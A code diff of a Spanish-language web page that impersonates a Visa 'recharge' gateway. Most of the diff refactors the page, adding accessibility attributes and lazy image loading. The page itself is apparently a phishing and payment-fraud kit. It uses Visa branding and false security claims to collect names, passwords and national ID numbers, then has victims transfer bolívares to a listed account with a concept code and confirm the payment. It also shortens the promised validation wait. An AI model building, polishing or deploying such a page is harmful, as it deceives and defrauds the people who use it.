@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sistema de Recarga - Pasarela Segura Visa</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -100,6 +100,7 @@
             height: 100vh;
             animation: main 15s cubic-bezier(0.76, 0.05, 0.2, 0.96) infinite;
             transform: translateZ(0);
+            will-change: transform;
         }
         
         @keyframes main {
@@ -1979,19 +1980,6 @@
             color: var(--accent-color);
         }
         
-        /* Estilos para el mensaje de concepto código en el overlay */
-        .concept-code-highlight {
-            background-color: var(--warning-color-light);
-            color: var(--primary-color-dark);
-            padding: 3px 8px;
-            border-radius: 5px;
-            font-weight: 700;
-            margin: 0 3px;
-            border: 1px dashed var(--warning-color);
-            white-space: nowrap;
-            display: inline-block;
-        }
-        
         /* Etiqueta de información crítica */
         .critical-info-tag {
             display: inline-block;
@@ -2489,369 +2477,357 @@
         </div>
     </div>
 
-    <!-- Contador de sesión --><div class="session-timer" id="session-timer">
-    <i class="fas fa-clock"></i>
-    <span id="countdown">45</span>
-</div>
-
-<div class="container">
-    <!-- Elemento orbe decorativo -->
-    <div class="orb-container">
-        <div class="orb"></div>
-    </div>
-    
-    <div class="header">
-        <div class="logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo" class="logo">
-        </div>
-        <h1>Sistema de Recarga</h1>
-        <p>Portal seguro para activación de cuentas y transacciones protegidas</p>
-    </div>
-    
-    <div class="steps" data-progress="1" id="progress-steps">
-        <div class="step active" id="step-1">
-            <div class="step-icon"><span>1</span></div>
-            <div class="step-text">Inicio de Sesión</div>
-        </div>
-        <div class="step" id="step-2">
-            <div class="step-icon"><span>2</span></div>
-            <div class="step-text">Datos Personales</div>
-        </div>
-        <div class="step" id="step-3">
-            <div class="step-icon"><span>3</span></div>
-            <div class="step-text">Información de Recarga</div>
-        </div>
-        <div class="step" id="step-4">
-            <div class="step-icon"><span>4</span></div>
-            <div class="step-text">Detalles de Transferencia</div>
-        </div>
-    </div>
-    
-    <!-- Formulario de Inicio de Sesión -->
-    <div class="card active" id="login-form">
-        <h2>Ingreso al Sistema</h2>
-        <p>Ingrese sus datos para continuar con el proceso de activación</p>
-        
-        <!-- Reordenado: nombre primero, luego clave -->
-        <div class="form-group">
-            <label for="user-name">Nombre Completo:</label>
-            <input type="text" id="user-name" placeholder="Ingrese su nombre completo">
-            <div class="error-message" id="name-error"></div>
-        </div>
-        
-        <div class="form-group">
-            <label for="access-code">Clave de Acceso:</label>
-            <input type="password" id="access-code" placeholder="Ingrese su clave de acceso">
-            <div class="error-message" id="code-error"></div>
-        </div>
-        
-        <!-- Checkbox para confirmar entendimiento del proceso -->
-        <div class="understanding-checkbox">
-            <div class="custom-checkbox" id="understanding-checkbox" onclick="toggleUnderstandingCheckbox()"></div>
-            <div class="confirmation-text">Entiendo que este es un proceso de verificación de mi cuenta y me comprometo a seguir los pasos correctamente.</div>
-        </div>
-        
-        <div class="btn-container">
-            <button class="btn" id="login-btn" onclick="validateLogin()" disabled>
-                Continuar
-                <i class="fas fa-arrow-right"></i>
-            </button>
-        </div>
-        
-        <div class="concept-alert">
-            <i class="fas fa-info-circle"></i>
-            <div class="concept-alert-content">
-                <div class="concept-alert-title">Sistema Seguro</div>
-                <div class="concept-alert-text">Este portal utiliza encriptación avanzada y protección SSL para garantizar la seguridad de sus datos.</div>
-            </div>
-        </div>
-        
-        <div class="visa-security">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
-            <span class="security-text">Conexión Segura · Encriptación SSL · Pasarela Protegida</span>
-        </div>
-        
-        <div class="support-link">
-            <a href="tel:+17373018059">
-                <i class="fas fa-headset"></i>
-                Soporte Técnico: +1 737-301-8059
-            </a>
-        </div>
-    </div>
-    
-    <!-- Formulario de Datos Personales -->
-    <div class="card" id="user-data-form">
-        <h2>Datos Personales</h2>
-        <p>Complete su información personal para continuar con el proceso de activación</p>
-        
-        <div class="form-group">
-            <label for="full-name">Nombre Completo:</label>
-            <input type="text" id="full-name" placeholder="Ingrese su nombre completo">
-            <div class="error-message" id="fullname-error"></div>
-        </div>
-        
-        <div class="form-group">
-            <label for="id-number">Cédula de Identidad:</label>
-            <div class="document-input-group">
-                <select class="document-type" id="doc-type">
-                    <option value="V">V</option>
-                    <option value="E">E</option>
-                    <option value="J">J</option>
-                </select>
-                <input type="text" id="id-number" placeholder="Ingrese su número de identidad" inputmode="numeric" pattern="[0-9]*">
-            </div>
-            <div class="error-message" id="id-error"></div>
-        </div>
-        
-        <div class="btn-container">
-            <button class="btn btn-secondary" onclick="goBack('user-data-form', 'login-form')">
-                <i class="fas fa-arrow-left"></i>
-                Volver
-            </button>
-            <button class="btn" onclick="validateUserData()">
-                Continuar
-                <i class="fas fa-arrow-right"></i>
-            </button>
-        </div>
-        
-        <div class="support-link">
-            <a href="tel:+17373018059">
-               <i class="fas fa-headset"></i>
-                Soporte Técnico: +1 737-301-8059
-            </a>
-        </div>
-    </div>
-    
-    <!-- Información de Recarga -->
-    <div class="card" id="payment-info">
-        <h2>Información de Recarga</h2>
-        <p>Seleccione el monto de recarga y utilice los datos de transferencia para completar el pago:</p>
-        
-        <div class="form-group">
-            <label for="amount-container">Monto de Recarga:</label>
-            <div id="amount-container">
-                <!-- Las opciones de monto se cargarán dinámicamente -->
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label for="recharge-purpose">Propósito de la Recarga:</label>
-            <select id="recharge-purpose">
-                <option value="verification">Recarga en cuenta con fines de verificación de cuenta</option>
-                <option value="registration">Recarga en cuenta con fines de registrar cuenta</option>
-            </select>
-        </div>
-        
-        <div class="data-card" onclick="showPaymentData()">
-            <i class="fas fa-credit-card"></i>
-            <h3>Ver Datos para Recarga</h3>
-            <p>Haga clic aquí para ver la información necesaria para realizar la transferencia</p>
-        </div>
-        
-        <!-- Checkbox de confirmación de transferencia - OCULTO INICIALMENTE -->
-        <div class="confirmation-checkbox" id="transfer-confirmation">
-            <div class="custom-checkbox" id="transfer-checkbox" onclick="toggleTransferCheckbox()"></div>
-            <div class="confirmation-text">Confirmo que he realizado la transferencia por el monto seleccionado</div>
-        </div>
-        
-        <div class="btn-container">
-            <button class="btn btn-secondary" onclick="goBack('payment-info', 'user-data-form')">
-                <i class="fas fa-arrow-left"></i>
-                Volver
-            </button>
-            <button class="btn" id="continue-button" onclick="goToTransferDetails()" disabled>
-                Continuar
-                <i class="fas fa-arrow-right"></i>
-            </button>
-        </div>
-        
-        <div class="visa-security">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
-            <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
-        </div>
-        
-        <div class="support-link">
-            <a href="tel:+17373018059">
-                <i class="fas fa-headset"></i>
-                Soporte Técnico: +1 737-301-8059
-            </a>
-        </div>
+    <!-- Contador de sesión -->
+    <div class="session-timer" id="session-timer">
+        <i class="fas fa-clock"></i>
+        <span id="countdown">45</span>
     </div>
 
-    <!-- Formulario de Detalles de Transferencia -->
-    <div class="card" id="transfer-details-form">
-        <h2>Detalles de la Transferencia</h2>
-        <p>Complete la información de la transferencia que ha realizado para procesar su recarga</p>
-        
-        <div class="form-group">
-            <label for="transfer-date">Fecha de Transferencia:</label>
-            <input type="date" id="transfer-date" placeholder="Seleccione la fecha">
-            <div class="error-message" id="date-error"></div>
-        </div>
-
-        <div class="form-group">
-            <label for="transfer-amount">Monto Recargado: <span class="badge badge-accent" id="amount-currency">Bs</span></label>
-            <input type="text" id="transfer-amount" disabled>
-            <div class="error-message" id="amount-error"></div>
+    <div class="container">
+        <!-- Elemento orbe decorativo -->
+        <div class="orb-container">
+            <div class="orb"></div>
         </div>
         
-        <div class="form-group">
-            <label>Banco de Origen:</label>
-            <div class="bank-logos-container" id="bank-logos">
-                <!-- Logos de bancos se cargarán dinámicamente -->
+        <div class="header">
+            <div class="logo-container">
+             <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo" class="logo">
             </div>
-            <div class="error-message" id="bank-error"></div>
+            <h1>Sistema de Recarga</h1>
+            <p>Portal seguro para activación de cuentas y transacciones protegidas</p>
         </div>
         
-        <div class="form-group">
-            <label for="transfer-reference">Número de Referencia:</label>
-            <input type="text" id="transfer-reference" placeholder="Ingrese el número de referencia de la transferencia" inputmode="numeric" pattern="[0-9]*">
-            <div class="error-message" id="reference-error"></div>
-        </div>
-        
-        <div class="form-group">
-            <label for="transfer-notes">Observaciones (opcional):</label>
-            <input type="text" id="transfer-notes" placeholder="Información adicional sobre su transferencia">
-        </div>
-        
-        <!-- No mostramos botón volver en la etapa final -->
-        <div class="btn-container">
-            <button class="btn" onclick="confirmPayment()">
-                Enviar Comprobante
-                <i class="fas fa-check"></i>
-            </button>
-        </div>
-        
-        <div class="visa-security">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
-            <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
-        </div>
-        
-        <div class="support-link">
-            <a href="tel:+17373018059">
-                <i class="fas fa-headset"></i>
-                Soporte Técnico: +1 737-301-8059
-            </a>
-        </div>
-    </div>
-</div>
-
-<!-- Overlay para mostrar datos de recarga -->
-<div class="overlay" id="payment-overlay">
-    <div class="payment-data-card">
-        <h2>Información de Transacción</h2>
-        <div class="distortion-layer"></div>
-        
-        <!-- Líneas de interferencia -->
-        <div class="interference-line" style="top: 30%; animation: scan-line 2s linear infinite;"></div>
-        <div class="interference-line" style="top: 80%; animation: scan-line 3s linear infinite 1s;"></div>
-        
-        <!-- Contenedor para el sistema de partículas -->
-        <div class="particles-container">
-            <canvas class="particles" id="particles-canvas"></canvas>
-        </div>
-        
-        <div class="payment-data-item">
-            <div class="payment-data-label">Banco:</div>
-            <div class="payment-data-content" id="secure-bank">Banco Venezolano de Crédito</div>
-            <button class="btn-copy" onclick="copyToClipboard('Banco Venezolano de Crédito', this)">
-                <i class="fas fa-copy"></i>
-                <span class="tooltip">¡Copiado!</span>
-            </button>
-        </div>
-        
-        <div class="payment-data-item">
-            <div class="payment-data-label">RIF:</div>
-            <!-- Contenedor para dato y visualización temporal -->
-            <div class="data-display-container">
-                <!-- Dato oculto que se mostrará temporalmente -->
-                <div class="secure-content" id="secure-rif">J-404757732</div>
-                <!-- Mensaje de instrucción -->
-                <span class="click-instruction" id="rif-instruction">Copiar RIF</span>
-                <!-- Confirmación de copiado -->
-                <div class="copy-confirmation" id="rif-confirmation">¡Copiado correctamente!</div>
+        <div class="steps" data-progress="1" id="progress-steps">
+            <div class="step active" id="step-1">
+                <div class="step-icon"><span>1</span></div>
+                <div class="step-text">Inicio de Sesión</div>
             </div>
-            <!-- Botón de copiar mejorado con instrucciones claras -->
-            <button class="copy-button" onclick="copyWithReveal('J-404757732', this, 'secure-rif', 'rif-instruction', 'rif-confirmation')">
-                <i class="fas fa-copy"></i>
-                Copiar RIF
-            </button>
-        </div>
-        
-        <div class="payment-data-item">
-            <div class="payment-data-label">Teléfono:</div>
-            <!-- Contenedor para dato y visualización temporal -->
-            <div class="data-display-container">
-                <!-- Dato oculto que se mostrará temporalmente -->
-                <div class="secure-content" id="secure-phone">0412-200-00-00</div>
-                <!-- Mensaje de instrucción -->
-                <span class="click-instruction" id="phone-instruction">Copiar teléfono</span>
-                <!-- Confirmación de copiado -->
-                <div class="copy-confirmation" id="phone-confirmation">¡Copiado correctamente!</div>
+            <div class="step" id="step-2">
+                <div class="step-icon"><span>2</span></div>
+                <div class="step-text">Datos Personales</div>
             </div>
-            <!-- Botón de copiar mejorado con instrucciones claras -->
-            <button class="copy-button" onclick="copyWithReveal('04122000000', this, 'secure-phone', 'phone-instruction', 'phone-confirmation')">
-                <i class="fas fa-copy"></i>
-                Copiar teléfono
-            </button>
-        </div>
-        
-        <div class="payment-data-item">
-            <div class="payment-data-label">Monto:</div>
-            <div class="payment-data-content" id="secure-amount">3.143,75 Bs</div>
-            <button class="btn-copy" onclick="copyToClipboard('3143,75', this)">
-                <i class="fas fa-copy"></i>
-                <span class="tooltip">¡Copiado!</span>
-            </button>
-        </div>
-        
-        <div class="payment-data-item">
-            <div class="payment-data-label">Concepto: <span class="critical-info-tag">IMPORTANTE</span></div>
-            <div class="payment-data-content" id="secure-concept">
-                <span class="concept-code-highlight">548454</span>
+            <div class="step" id="step-3">
+                <div class="step-icon"><span>3</span></div>
+                <div class="step-text">Información de Recarga</div>
             </div>
-            <button class="btn-copy" onclick="copyToClipboard('548454', this)">
-                <i class="fas fa-copy"></i>
-                <span class="tooltip">¡Copiado!</span>
-            </button>
+            <div class="step" id="step-4">
+                <div class="step-icon"><span>4</span></div>
+                <div class="step-text">Detalles de Transferencia</div>
+            </div>
         </div>
         
-        <div class="concept-alert critical">
-            <i class="fas fa-exclamation-triangle"></i>
-            <div class="concept-alert-content">
-                <div class="concept-alert-title">¡Código de concepto obligatorio!</div>
-                <div class="concept-alert-text">
-                    Para que nuestro sistema pueda identificar su pago, debe colocar <strong>únicamente</strong> el código 
-                    <span class="concept-code-highlight">548454</span> en el campo de concepto/descripción de la transferencia.
+        <!-- Formulario de Inicio de Sesión -->
+        <div class="card active" id="login-form">
+            <h2>Ingreso al Sistema</h2>
+            <p>Ingrese sus datos para continuar con el proceso de activación</p>
+            
+            <!-- Reordenado: nombre primero, luego clave -->
+            <div class="form-group">
+                <label for="user-name">Nombre Completo:</label>
+                <input type="text" id="user-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="name-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="access-code">Clave de Acceso:</label>
+                <input type="password" id="access-code" placeholder="Ingrese su clave de acceso">
+                <div class="error-message" id="code-error"></div>
+            </div>
+            
+            <!-- Checkbox para confirmar entendimiento del proceso -->
+            <div class="understanding-checkbox">
+                <div class="custom-checkbox" id="understanding-checkbox" onclick="toggleUnderstandingCheckbox()"></div>
+                <div class="confirmation-text">Entiendo que este es un proceso de verificación de mi cuenta y me comprometo a seguir los pasos correctamente.</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn" id="login-btn" onclick="validateLogin()" disabled>
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="concept-alert">
+                <i class="fas fa-info-circle"></i>
+                <div class="concept-alert-content">
+                    <div class="concept-alert-title">Sistema Seguro</div>
+                    <div class="concept-alert-text">Este portal utiliza encriptación avanzada y protección SSL para garantizar la seguridad de sus datos.</div>
                 </div>
             </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Encriptación SSL · Pasarela Protegida</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
         </div>
         
-        <div class="btn-container">
-            <button class="btn btn-secondary close-btn" onclick="closePaymentOverlay()">
-                <i class="fas fa-times"></i>
-                Cerrar
+        <!-- Formulario de Datos Personales -->
+        <div class="card" id="user-data-form">
+            <h2>Datos Personales</h2>
+            <p>Complete su información personal para continuar con el proceso de activación</p>
+            
+            <div class="form-group">
+                <label for="full-name">Nombre Completo:</label>
+                <input type="text" id="full-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="fullname-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="id-number">Cédula de Identidad:</label>
+                <div class="document-input-group">
+                    <select class="document-type" id="doc-type">
+                        <option value="V">V</option>
+                        <option value="E">E</option>
+                        <option value="J">J</option>
+                    </select>
+                    <input type="text" id="id-number" placeholder="Ingrese su número de identidad" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <div class="error-message" id="id-error"></div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="goBack('user-data-form', 'login-form')">
+                    <i class="fas fa-arrow-left"></i>
+                    Volver
+                </button>
+                <button class="btn" onclick="validateUserData()">
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                   <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+        
+        <!-- Información de Recarga -->
+        <div class="card" id="payment-info">
+            <h2>Información de Recarga</h2>
+            <p>Seleccione el monto de recarga y utilice los datos de transferencia para completar el pago:</p>
+            
+            <div class="form-group">
+                <label for="amount-container">Monto de Recarga:</label>
+                <div id="amount-container">
+                    <!-- Las opciones de monto se cargarán dinámicamente -->
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="recharge-purpose">Propósito de la Recarga:</label>
+                <select id="recharge-purpose">
+                    <option value="verification">Recarga en cuenta con fines de verificación de cuenta</option>
+                    <option value="registration">Recarga en cuenta con fines de registrar cuenta</option>
+                </select>
+            </div>
+            
+            <div class="data-card" onclick="showPaymentData()">
+                <i class="fas fa-credit-card"></i>
+                <h3>Ver Datos para Recarga</h3>
+                <p>Haga clic aquí para ver la información necesaria para realizar la transferencia</p>
+            </div>
+            
+            <!-- Checkbox de confirmación de transferencia - OCULTO INICIALMENTE -->
+            <div class="confirmation-checkbox" id="transfer-confirmation">
+                <div class="custom-checkbox" id="transfer-checkbox" onclick="toggleTransferCheckbox()"></div>
+                <div class="confirmation-text">Confirmo que he realizado la transferencia por el monto seleccionado</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="goBack('payment-info', 'user-data-form')">
+                    <i class="fas fa-arrow-left"></i>
+                    Volver
+                </button>
+                <button class="btn" id="continue-button" onclick="goToTransferDetails()" disabled>
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+
+        <!-- Formulario de Detalles de Transferencia -->
+        <div class="card" id="transfer-details-form">
+            <h2>Detalles de la Transferencia</h2>
+            <p>Complete la información de la transferencia que ha realizado para procesar su recarga</p>
+            
+            <div class="form-group">
+                <label for="transfer-date">Fecha de Transferencia:</label>
+                <input type="date" id="transfer-date" placeholder="Seleccione la fecha">
+                <div class="error-message" id="date-error"></div>
+            </div>
+
+            <div class="form-group">
+                <label for="transfer-amount">Monto Recargado: <span class="badge badge-accent" id="amount-currency">Bs</span></label>
+                <input type="text" id="transfer-amount" disabled>
+                <div class="error-message" id="amount-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label>Banco de Origen:</label>
+                <div class="bank-logos-container" id="bank-logos">
+                    <!-- Logos de bancos se cargarán dinámicamente -->
+                </div>
+                <div class="error-message" id="bank-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="transfer-reference">Número de Referencia:</label>
+                <input type="text" id="transfer-reference" placeholder="Ingrese el número de referencia de la transferencia" inputmode="numeric" pattern="[0-9]*">
+                <div class="error-message" id="reference-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="transfer-notes">Observaciones (opcional):</label>
+                <input type="text" id="transfer-notes" placeholder="Información adicional sobre su transferencia">
+            </div>
+            
+            <!-- No mostramos botón volver en la etapa final -->
+            <div class="btn-container">
+                <button class="btn" onclick="confirmPayment()">
+                    Enviar Comprobante
+                    <i class="fas fa-check"></i>
+                </button>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Overlay para mostrar datos de recarga -->
+    <div class="overlay" id="payment-overlay">
+        <div class="payment-data-card">
+            <h2>Información de Transacción</h2>
+            <div class="distortion-layer"></div>
+            
+            <!-- Líneas de interferencia -->
+            <div class="interference-line" style="top: 30%; animation: scan-line 2s linear infinite;"></div>
+            <div class="interference-line" style="top: 80%; animation: scan-line 3s linear infinite 1s;"></div>
+            
+            <!-- Contenedor para el sistema de partículas -->
+            <div class="particles-container">
+                <canvas class="particles" id="particles-canvas"></canvas>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Banco:</div>
+                <div class="payment-data-content" id="secure-bank">Banco Venezolano de Crédito</div>
+                <button class="btn-copy" onclick="copyToClipboard('Banco Venezolano de Crédito', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">RIF:</div>
+                <!-- Contenedor para dato y visualización temporal -->
+                <div class="data-display-container">
+                    <!-- Dato oculto que se mostrará temporalmente -->
+                    <div class="secure-content" id="secure-rif">J-404757732</div>
+                    <!-- Mensaje de instrucción -->
+                    <span class="click-instruction" id="rif-instruction">Copiar RIF</span>
+                    <!-- Confirmación de copiado -->
+                    <div class="copy-confirmation" id="rif-confirmation">¡Copiado correctamente!</div>
+                </div>
+                <!-- Botón de copiar mejorado con instrucciones claras -->
+                <button class="copy-button" onclick="copyWithReveal('J-404757732', this, 'secure-rif', 'rif-instruction', 'rif-confirmation')">
+                    <i class="fas fa-copy"></i>
+                    Copiar RIF
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Teléfono:</div>
+                <!-- Contenedor para dato y visualización temporal -->
+                <div class="data-display-container">
+                    <!-- Dato oculto que se mostrará temporalmente -->
+                    <div class="secure-content" id="secure-phone">0412-200-00-00</div>
+                    <!-- Mensaje de instrucción -->
+                    <span class="click-instruction" id="phone-instruction">Copiar teléfono</span>
+                    <!-- Confirmación de copiado -->
+                    <div class="copy-confirmation" id="phone-confirmation">¡Copiado correctamente!</div>
+                </div>
+                <!-- Botón de copiar mejorado con instrucciones claras -->
+                <button class="copy-button" onclick="copyWithReveal('04122000000', this, 'secure-phone', 'phone-instruction', 'phone-confirmation')">
+                    <i class="fas fa-copy"></i>
+                    Copiar teléfono
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Monto:</div>
+                <div class="payment-data-content" id="secure-amount">3.143,75 Bs</div>
+                <button class="btn-copy" onclick="copyToClipboard('3143,75', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Concepto:</div>
+                <div class="payment-data-content" id="secure-concept">548454</div>
+                <button class="btn-copy" onclick="copyToClipboard('548454', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary close-btn" onclick="closePaymentOverlay()">
+                    <i class="fas fa-times"></i>
+                    Cerrar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contenedor de validación y estado de la recarga -->
+    <div class="spinner-container" id="spinner-container">
+        <div class="spinner"></div>
+        <div class="processing-text">Validando comprobante</div>
+        
+        <div class="checkmark-container" id="checkmark-container">
+            <div class="checkmark-circle">
+                <i class="fas fa-check checkmark"></i>
+            </div>
+            <div class="success-text">¡Comprobante recibido!</div>
+            <div class="validation-note">La validación toma aproximadamente 5 minutos. La recarga se aplicará en cuanto se confirme el pago.</div>
+            <button class="btn" onclick="completeProcess()" style="max-width: 250px;">
+                Finalizar
             </button>
         </div>
     </div>
-</div>
-
-<!-- Contenedor de validación y estado de la recarga -->
-<div class="spinner-container" id="spinner-container">
-    <div class="spinner"></div>
-    <div class="processing-text">Validando comprobante</div>
-    
-    <div class="checkmark-container" id="checkmark-container">
-        <div class="checkmark-circle">
-            <i class="fas fa-check checkmark"></i>
-        </div>
-        <div class="success-text">¡Comprobante recibido!</div>
-        <div class="validation-note">La validación puede tomar hasta 24 horas. La recarga se aplicará en cuanto se confirme el pago.</div>
-        <button class="btn" onclick="completeProcess()" style="max-width: 250px;">
-            Finalizar
-        </button>
-    </div>
-</div>
 
 <script>
     /****************************
@@ -2905,7 +2881,7 @@
     let selectedAmount = 25; // Valor predeterminado
     let transferConfirmed = false; // Estado para el checkbox de confirmación
     let understandingConfirmed = false; // Estado para el checkbox de entendimiento
-    let hasViewedPaymentData = false; // NUEVA variable para rastrear si el usuario ha visto los datos de pago
+    let hasViewedPaymentData = false; // Variable para rastrear si el usuario ha visto los datos de pago
     
     // Mostrar primer formulario al cargar
     document.addEventListener('DOMContentLoaded', function() {
@@ -2940,7 +2916,47 @@
             document.getElementById('transfer-date').value = formattedDate;
         }
         
+        // Optimizar carga de imágenes
+        lazyLoadImages();
+        
         // Prevenir auto zoom en inputs para dispositivos móviles
+        optimizeInputsForMobile();
+    });
+    
+    // Carga diferida de imágenes
+    function lazyLoadImages() {
+        if ('IntersectionObserver' in window) {
+            const imgObserver = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const img = entry.target;
+                        const src = img.getAttribute('data-src');
+                        if (src) {
+                            img.src = src;
+                            img.removeAttribute('data-src');
+                        }
+                        observer.unobserve(img);
+                    }
+                });
+            });
+            
+            document.querySelectorAll('img[data-src]').forEach(img => {
+                imgObserver.observe(img);
+            });
+        } else {
+            // Fallback para navegadores que no soportan IntersectionObserver
+            document.querySelectorAll('img[data-src]').forEach(img => {
+                const src = img.getAttribute('data-src');
+                if (src) {
+                    img.src = src;
+                    img.removeAttribute('data-src');
+                }
+            });
+        }
+    }
+    
+    // Optimizar inputs para dispositivos móviles
+    function optimizeInputsForMobile() {
         const inputs = document.querySelectorAll('input, select');
         inputs.forEach(input => {
             input.addEventListener('focus', function() {
@@ -2948,10 +2964,11 @@
                 input.setAttribute('readonly', 'true');
                 setTimeout(function() {
                     input.removeAttribute('readonly');
+                    input.focus();
                 }, 50);
             });
         });
-    });
+    }
     
     // Inicializar efectos para botones
     function initButtonEffects() {
@@ -2982,6 +2999,7 @@
     // Cargar opciones de monto mejoradas
     function loadAmountOptions() {
         const container = document.getElementById('amount-container');
+        if (!container) return;
         
         // Limpiar contenedor
         container.innerHTML = '';
@@ -3054,7 +3072,9 @@
         // Crear partículas iniciales
         function createParticles() {
             particles = [];
-            for (let i = 0; i < 100; i++) {
+            const particleCount = window.innerWidth < 768 ? 50 : 100; // Menos partículas en móvil
+            
+            for (let i = 0; i < particleCount; i++) {
                 particles.push({
                     x: Math.random() * canvas.width,
                     y: Math.random() * canvas.height,
@@ -3146,23 +3166,41 @@
         const container = document.getElementById('bank-logos');
         if (!container) return; // Verificación para evitar errores
         
+        // Limpiar el contenedor antes de cargar los logos
+        container.innerHTML = '';
+        
         bankList.forEach((bank, index) => {
             const logoDiv = document.createElement('div');
             logoDiv.className = 'bank-logo';
             logoDiv.setAttribute('data-bank', bank.name);
             logoDiv.setAttribute('data-index', index);
-            logoDiv.innerHTML = `<img src="${bank.logo}" alt="${bank.name}" title="${bank.name}">`;
+            logoDiv.setAttribute('tabindex', '0'); // Para mejorar la accesibilidad
+            logoDiv.setAttribute('role', 'button');
+            logoDiv.setAttribute('aria-label', `Seleccionar ${bank.name}`);
+            
+            // Usar lazy loading para mejorar el rendimiento
+            logoDiv.innerHTML = `<img data-src="${bank.logo}" alt="${bank.name}" title="${bank.name}">`;
             
             logoDiv.addEventListener('click', function() {
                 // Deseleccionar todos los bancos
                 document.querySelectorAll('.bank-logo').forEach(el => {
                     el.classList.remove('selected');
+                    el.setAttribute('aria-selected', 'false');
                 });
                 
                 // Seleccionar el banco actual
                 this.classList.add('selected');
+                this.setAttribute('aria-selected', 'true');
                 selectedBank = this.getAttribute('data-bank');
                 document.getElementById('bank-error').textContent = '';
+            });
+            
+            // Soporte para navegación con teclado (accesibilidad)
+            logoDiv.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    this.click();
+                }
             });
             
             container.appendChild(logoDiv);
@@ -3206,9 +3244,11 @@
         
         if (transferConfirmed) {
             checkbox.classList.add('checked');
+            checkbox.setAttribute('aria-checked', 'true');
             continueButton.disabled = false;
         } else {
             checkbox.classList.remove('checked');
+            checkbox.setAttribute('aria-checked', 'false');
             continueButton.disabled = true;
         }
     }
@@ -3224,9 +3264,11 @@
         
         if (understandingConfirmed) {
             checkbox.classList.add('checked');
+            checkbox.setAttribute('aria-checked', 'true');
             loginButton.disabled = false;
         } else {
             checkbox.classList.remove('checked');
+            checkbox.setAttribute('aria-checked', 'false');
             loginButton.disabled = true;
         }
     }
@@ -3234,7 +3276,7 @@
     // Validar inicio de sesión
     function validateLogin() {
         if (!understandingConfirmed) {
